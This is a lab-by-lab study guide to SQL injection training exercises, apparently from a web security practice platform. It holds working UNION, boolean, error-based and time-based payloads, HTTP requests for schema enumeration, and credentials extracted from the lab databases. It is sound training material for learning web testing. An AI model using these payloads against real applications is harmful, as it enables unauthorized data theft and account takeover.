# SQL Injection Labs — Complete Guide

A practical walkthrough of SQL injection techniques across 12+ labs, from basic exploitation to advanced blind techniques.

---

## Lab 2: Login Functionality — Basic SQLi

**Goal:** Perform SQL injection to log in as the admin user.

**Vulnerability:** Single quote causes a 500 error, indicating SQL parsing vulnerability.

**Attack steps:**
1. Test for vulnerability: send a single quote (`'`) → returns error 500 (vulnerable).
2. Attempt login with comment bypass: `admin'--` (did not work).
3. Try alternative admin usernames: `administrator`, `root`, etc.

**Example payloads:**
```sql
SELECT firstname FROM users WHERE username = ''' AND password = 'admin'
-- Returns error 500, confirming injection point

SELECT firstname FROM users WHERE username = 'administrator'--' AND password = 'admin'
-- Attempt to bypass by assuming different admin username
```

**Takeaway:** Always test for alternate admin usernames; `admin` may not be the username in the database.

---

## Lab 3: Product Category Filter — UNION-Based SQLi (Intro)

**Goal:** Determine the number of columns returned by the query.

**Background (UNION attack):**
- Number and order of columns must match across all queries.
- Data types must be compatible.

**Attack methods:**

### Method 1: NULL-based column counting
```sql
SELECT ? FROM table1 UNION SELECT NULL
-- If error: column count is not 1
-- If success: column count is 1
```

### Method 2: ORDER BY clause
```sql
SELECT ? FROM table1 ORDER BY 1      -- No error: at least 1 column
SELECT ? FROM table1 ORDER BY 2      -- No error: at least 2 columns
SELECT ? FROM table1 ORDER BY 3      -- Error: exactly 2 columns
```

**Example HTTP requests:**
```
GET /filter?category=Gifts' UNION SELECT NULL HTTP/2
GET /filter?category=Gifts' UNION SELECT NULL,NULL,NULL HTTP/2
GET /filter?category=Gifts' ORDER BY 3-- HTTP/2
```

**Takeaway:** Identify column count before proceeding with data extraction.

---

## Lab 4: Product Category Filter — Data Type Detection

**Goal:** Determine the number and data types of columns.

**Attack steps:**
1. Find column count using `ORDER BY` → returns 2 columns.
2. Detect data types using UNION with mixed types:
   ```sql
   ' UNION SELECT 'a', NULL--
   ' UNION SELECT 'a', 'a'--
   ```
   Both succeed → both columns accept strings.

3. Extract credentials from users table:
   ```sql
   ' UNION SELECT username, password FROM users--
   ```

**Result:**
```
carlos         q0efpiiaf5bhcxt1oq6r
administrator  q4pvk0peh3kinr1hyh0y
```

**Takeaway:** Test data types systematically; not all columns may be string-compatible.

---

## Lab 5: Product Category Filter — Querying Multiple Tables (PostgreSQL)

**Goal:** Extract all usernames and passwords; login as administrator.

**Attack steps:**
1. Find column count → 2 columns.
2. Detect string columns → both are strings.
3. Detect database version:
   ```sql
   ' UNION SELECT NULL, version()--
   -- PostgreSQL 12.22 (Ubuntu 12.22...)
   ```

4. Extract credentials using PostgreSQL concatenation:
   ```sql
   ' UNION SELECT NULL, username ||' '|| password FROM users--
   ```

**Result:**
```
carlos          olhrvefqd7fsxrw7xoi5
administrator   obc1p5s1d3lz0brrpl28
wiener          hedqtb7udtgqb3cafylx
```

**Takeaway:** Database-specific syntax (e.g., `||` for PostgreSQL, `+` for SQL Server, `CONCAT()` for MySQL) is crucial.

---

## Lab 6: Product Category Filter — Oracle Database

**Goal:** Display the database version (Oracle).

**Key difference:** Oracle requires a `FROM` clause; use the `DUAL` dummy table.

**Attack steps:**
1. Column count → 2.
2. Data types → both strings (using DUAL):
   ```sql
   ' UNION SELECT 'a', 'a' FROM DUAL--
   ```

3. Query version:
   ```sql
   ' UNION SELECT banner, NULL FROM v$version--
   ```

**Result:**
```
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
```

**Takeaway:** Oracle requires `FROM DUAL` and uses different system tables (`v$version` instead of `version()` or `@@version`).

---

## Lab 7: Product Category Filter — MySQL/MSSQL Version Detection

**Goal:** Display the database version on MySQL or MSSQL.

**Detected version:**
```
MySQL 8.0.42-0ubuntu0.20.04.1
```

**Version queries by database:**
- Oracle: `SELECT banner FROM v$version`
- PostgreSQL: `SELECT version()`
- MySQL: `SELECT @@version`
- MSSQL: `SELECT @@version`

**Takeaway:** Test version queries systematically if database type is unknown.

---

## Lab 8: Product Category Filter — MySQL/MSSQL Version Queries

**Goal:** Extract database version and column structure.

**Analysis:**
- Column count: 3 (determined via `ORDER BY`).
- Column types: both strings.
- Version: MySQL 8.0.42-0ubuntu0.20.04.1.

**Takeaway:** Consistent approach across similar labs.

---

## Lab 9: Listing Database Contents (Non-Oracle)

**Goal:** Identify the users table, extract usernames and passwords, login as administrator.

**Attack steps:**
1. Determine column count → 2.
2. Confirm column types → both strings.
3. Detect database version → PostgreSQL.
4. List all tables:
   ```sql
   ' UNION SELECT table_name, NULL FROM information_schema.tables--
   ```

5. Find the users table (obfuscated): `users_rdqsus`.

6. List columns in `users_rdqsus`:
   ```sql
   ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_rdqsus'--
   ```
   Result: `username_vjyqgf`, `password_lzorjv`.

7. Extract credentials:
   ```sql
   ' UNION SELECT username_vjyqgf, password_lzorjv FROM users_rdqsus--
   ```

**Result:**
```
administrator  1bvplx622a19q681i2tt
```

**Takeaway:** Use `information_schema` tables to enumerate database structure dynamically.

---

## Lab 10: Listing Database Contents (Oracle)

**Goal:** Identify users table, extract credentials, login as administrator (Oracle).

**Key queries for Oracle:**
- List tables: `SELECT TABLE_NAME, NULL FROM all_tables`
- List columns: `SELECT COLUMN_NAME, NULL FROM all_tab_columns WHERE table_name = 'TABLE_NAME'`

**Attack steps:**
1. Column count → 2.
2. Confirm string types (using DUAL) → both strings.
3. List tables:
   ```sql
   ' UNION SELECT TABLE_NAME, NULL FROM all_tables--
   ```
   Found: `USERS_UHYKUV`.

4. List columns:
   ```sql
   ' UNION SELECT COLUMN_NAME, NULL FROM all_tab_columns WHERE table_name = 'USERS_UHYKUV'--
   ```
   Columns: `USERNAME_OBEUAV`, `PASSWORD_ZVMFQR`.

5. Extract credentials (similar to non-Oracle labs).

**Takeaway:** Oracle uses `all_tables` and `all_tab_columns` instead of `information_schema`.

---

## Lab 11: Blind SQL Injection — Boolean-Based

**Goal:** Enumerate the administrator password via blind SQLi (boolean-based).

**Vulnerability:** Vulnerable tracking ID cookie. Response contains "welcome back" if query returns a row, otherwise no message.

**Attack steps:**

### 1. Confirm blind SQLi vulnerability
```sql
TrackingId = CSV4FVI9FVDm20yU' and 1=1--
-- Result: "welcome back" (true condition)

TrackingId = CSV4FVI9FVDm20yU' and 1=2--
-- Result: no message (false condition)
```

### 2. Confirm users table exists
```sql
SELECT 'x' FROM users LIMIT 1
-- Wrapped: and (SELECT 'x' FROM users LIMIT 1)='x'--
```

### 3. Confirm administrator user exists
```sql
and (SELECT username FROM users WHERE username='administrator')='administrator'--
```

### 4. Find password length
```sql
and (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>1)='administrator'--
```
Result: Password length is 20.

### 5. Extract password character-by-character
```sql
and (SELECT substring(password, 1, 1) FROM users WHERE username='administrator')='a'--
```

Bruteforce each position with Burp Intruder to find:
```
b996rc0fqbayv05bns2l
```

**Takeaway:** Boolean-based blind SQLi requires observing response differences; use Intruder for efficient character extraction.

---

## Lab 12: Blind SQL Injection — Conditional Error-Based

**Goal:** Extract administrator password via error-based blind SQLi (Oracle).

**Vulnerability:** Same tracking cookie, but responses differ on error (500) vs. success (200).

**Attack steps:**

### 1. Confirm Oracle and SQLi
```sql
TrackingId = ' || (SELECT '' FROM dual) || '
-- Success: Oracle detected

TrackingId = ' || (SELECT '' FROM nonexistent_table) || '
-- Error: confirms injection
```

### 2. Confirm users table
```sql
' || (SELECT '' FROM users WHERE rownum=1) || '
-- Success
```

### 3. Error-based extraction using CASE + division by zero
```sql
' || (SELECT CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '
-- If condition is true → error (500)
-- If condition is false → no error (200)
```

### 4. Confirm administrator exists with conditional error
```sql
' || (SELECT CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users 
  WHERE username='administrator') || '
-- True admin exists → error 500
```

### 5. Determine password length
```sql
' || (SELECT CASE WHEN(LENGTH(password)>1) THEN TO_CHAR(1/0) ELSE '' END 
  FROM users WHERE username='administrator') || '
```
Binary search to find exact length.

### 6. Extract password character-by-character
```sql
' || (SELECT CASE WHEN(substr(password,1,1)='a') THEN TO_CHAR(1/0) ELSE '' END 
  FROM users WHERE username='administrator') || '
```

Bruteforce with Burp Intruder → extract password:
```
o6pg45qqx69tlgd0uxnm
```

**Takeaway:** Error-based blind SQLi uses database errors as a signal; condition is true when error occurs.

---

## Lab 13: Blind SQL Injection — Time-Based

**Goal:** Prove the field is vulnerable to time-based blind SQL injection.

**Technique:** Inject time-delay functions to trigger observable delays:
- Oracle: `DBMS_LOCK.SLEEP(seconds)`
- MySQL: `SLEEP(seconds)`
- PostgreSQL: `pg_sleep(seconds)`
- MSSQL: `WAITFOR DELAY 'hh:mm:ss'`

**Basic payload structure:**
```sql
' AND SLEEP(5)--
' OR SLEEP(5)--
' AND IF(condition, SLEEP(5), 0)--
```

**Attack approach:**
1. Send request with no delay → baseline response time.
2. Send request with injected delay → observe added delay.
3. Conditional delays: `IF(password_length>20, SLEEP(5), 0)` → extract data bit-by-bit.

**Takeaway:** Time-based blind SQLi is slower but works even when error/boolean feedback is unavailable.

---

## Quick Reference: Database Detection

| Database | Version Query | Concatenation | Dummy Table | System Tables |
|----------|---|---|---|---|
| **Oracle** | `SELECT banner FROM v$version` | `\|\|` | `DUAL` | `all_tables`, `all_tab_columns` |
| **MySQL** | `SELECT @@version` | `CONCAT()` | N/A | `information_schema` |
| **PostgreSQL** | `SELECT version()` | `\|\|` | N/A | `information_schema` |
| **MSSQL** | `SELECT @@version` | `+` | N/A | `information_schema` |

---

## Quick Reference: Blind SQLi Detection

| Type | Indicator | Extraction Method |
|------|-----------|---|
| **Boolean-based** | Response content differs (e.g., "welcome back" vs. nothing) | Character-by-character bruteforce |
| **Error-based** | HTTP status differs (200 vs. 500) | CASE + division by zero (Oracle) |
| **Time-based** | Response delay varies | Conditional sleep functions |

---

## General Workflow

1. **Confirm vulnerability:** Test for basic SQL errors (single quote, comment).
2. **Identify column count:** Use `ORDER BY` or `UNION SELECT NULL`.
3. **Detect data types:** Use `UNION SELECT` with mixed types.
4. **Identify database type:** Query version string.
5. **Enumerate structure:** List tables, columns, constraints.
6. **Extract sensitive data:** Usernames, passwords, secrets.
7. **Escalate privileges:** Log in as administrator or higher-privileged account.

---

## Lab Progression Summary

- **Labs 2–4:** UNION-based basics (column counting, data types).
- **Labs 5–8:** Database-specific UNION queries (PostgreSQL, Oracle, MySQL).
- **Labs 9–10:** Full table enumeration (information_schema vs. Oracle system tables).
- **Labs 11–13:** Blind SQL injection (boolean-based, error-based, time-based).

Each lab builds on prior techniques. Master UNION extraction before attempting blind SQLi.

---

## Important Notes

- Always confirm you have authorization before testing any application.
- Use Burp Suite Intruder to automate character extraction for blind SQLi.
- Test on isolated environments only.
- Document findings and remediation steps.
